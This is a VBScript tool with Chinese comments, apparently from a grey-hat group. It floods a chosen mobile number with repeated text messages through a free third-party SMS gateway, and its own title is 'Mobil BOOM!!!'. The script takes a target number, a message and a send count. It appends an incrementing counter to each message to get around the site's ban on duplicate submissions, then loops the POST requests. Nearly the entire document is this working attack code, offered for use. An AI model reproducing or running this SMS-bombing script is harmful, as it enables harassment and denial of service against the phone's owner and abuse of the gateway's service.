'作者:Lilo(小骗子) / 灰色轨迹
'VBS+XMLHTTP 利用免费短信网关 发手机短信

iEnter= Chr(13) & Chr(10)
Usage = "CScript iSMS.vbs 手机号码 您的姓名 您的性别 发送次数 发送内容 [累加因子]" & iEnter & iEnter & "注意: 性别中1表示先生,2表示'女士',如果您的姓名或发送内容中有空格或为空时,请使用引号将该参数引住。由于该网站不允许提交重复数据,所以在循环中参加了累加因子,该参数是数值型可选项。" & iEnter & iEnter & "CScript iSMS.vbs -h 查阅用法实例。"

Function URLEncoding(vstrIn)
	strReturn = ""
	For i = 1 To Len(vstrIn)
		ThisChr = Mid(vStrIn,i,1)
		If Abs(Asc(ThisChr)) < &HFF Then
			strReturn = strReturn & ThisChr
		Else
			innerCode = Asc(ThisChr)
			If innerCode < 0 Then
				innerCode = innerCode + &H10000
			End If
			Hight8 = (innerCode And &HFF00)\ &HFF
			Low8 = innerCode And &HFF
			strReturn = strReturn & "%" & Hex(Hight8) & "%" & Hex(Low8)
		End If
	Next
	URLEncoding = strReturn
End Function

Function bytes2BSTR(vIn)
	strReturn = ""
	For i = 1 To LenB(vIn)
		ThisCharCode = AscB(MidB(vIn,i,1))
		If ThisCharCode < &H80 Then
			strReturn = strReturn & Chr(ThisCharCode)
		Else
			NextCharCode = AscB(MidB(vIn,i+1,1))
			strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode))
			i = i + 1
		End If
	Next
	bytes2BSTR = strReturn
End Function

Function xmlPost(iPost,iUrl)
	iPost=URLEncoding(iPost)
	Set xPost = CreateObject("Microsoft.XMLHTTP")
	xPost.open "POST",iUrl,false
		xPost.setRequestHeader "Content-Length",Len(iPost)
		xPost.setRequestHeader "CONTENT-TYPE","application/x-www-form-urlencoded"
	xPost.send(iPost)
	xmlPost=bytes2BSTR(xPost.responseBody)
End Function

Function xmlHead(iUrl)
	iPost=URLEncoding(iPost)
	Set xPost = CreateObject("Microsoft.XMLHTTP")
	xPost.open "POST",iUrl,false
	xPost.send(iPost)
	'xmlHead=bytes2BSTR(xPost.responseBody)
End Function

Function GetBt(vString,iString,dString)
	iNum = inStr(Getinfo,iString)
	dNum = inStr(Getinfo,dString)
	iLen = Len(iString) + iNum
	GetBt= Mid(Getinfo,iLen,dNum-iLen)
End Function

Sub IsWrong()
	If IsNumeric(mobil)=False Then WScript.Echo "错误:手机号码应为纯数字。" : WScript.Quit
	If Len(mobil) <> 11 Then Wscript.Echo "错误:手机号码为11位数字。" : WScript.Quit
	If IsNumeric(cf)=False Then WScript.Echo "错误:性别错误,1代表先生,2代表女士。" : WScript.Quit
	If cf<>1 And cf<>2 Then WScript.Echo "错误:性别错误,1代表先生,2代表女士。" : WScript.Quit
	If message = "" Then WScript.Echo "错误:发送内容不能为空。" :WScript.Quit
	If IsNumeric(vlTitle)=False Then WScript.Echo "错误:发送次数应为纯数字。":WScript.Quit
	If IsNumeric(iStart)=False Then WScript.Echo "错误:发送次数因子应为纯数字。":WScript.Quit
End Sub

If (LCase(Right(WScript.Fullname,11))="wscript.exe") Then
	Msgbox "VBS+XMLHTTP 利用免费短信网关发手机短信" & iEnter & iEnter & "作者:Lilo(小骗子) - [灰色轨迹]" &iEnter &iEnter &Usage, 4096 , "Lilo/云淡鹭起       Mobil BOOM!!!"
	WScript.Quit
End If

If WScript.Arguments(0)="-h" Then WScript.Echo iEnter & iEnter & "例如:" & iEnter & iEnter & "CScript iSMS.vbs 01234567891 Lilo 1 100 hello 120" :WScript.Quit

If WScript.Arguments.Count < 5 Then
	WScript.Echo iEnter &Chr(7)& "错误:参数不够。" & iEnter & iEnter & "使用方法:" &iEnter &iEnter & Usage
	WScript.Quit
End If

mobil  = WScript.Arguments(0)
mname  = WScript.Arguments(1)
cf     = WScript.Arguments(2)
vlTitle= WScript.Arguments(3)
message= WScript.Arguments(4)
xcni   = "xcni"

If WScript.Arguments.Count=6 Then iStart = WScript.Arguments(5) Else iStart = 0
Call IsWrong()

WScript.Echo iEnter
For iSendNumeric=1 To Abs(vlTitle)
	Postr  = "mobil=" & mobil & "&name=" & mname & ":" & (iSendNumeric+iStart) & "&cf=" & cf & "&message=" & message & (iSendNumeric+iStart) & "&xcni=" & xcni
	Getinfo = xmlPost(Postr,"http://sms.bkwww.com/success.asp")
	ReturnInfo = GetBt(Getinfo,"javascript>alert('","');location")
	If inStr(ReturnInfo,"短信发送成功") Then ReturnInfo = Left (ReturnInfo,6) & "! 第" & iSendNumeric & "次."
	If inStr(ReturnInfo,"请不要反复提交") Then ReturnInfo = "发送失败!  第" & iSendNumeric & "次."
	WScript.Echo ReturnInfo
	xmlHead("http://sms.bkwww.com/index.asp")
	If iSendNumeric >= vlTitle+iStart Then Exit For
Next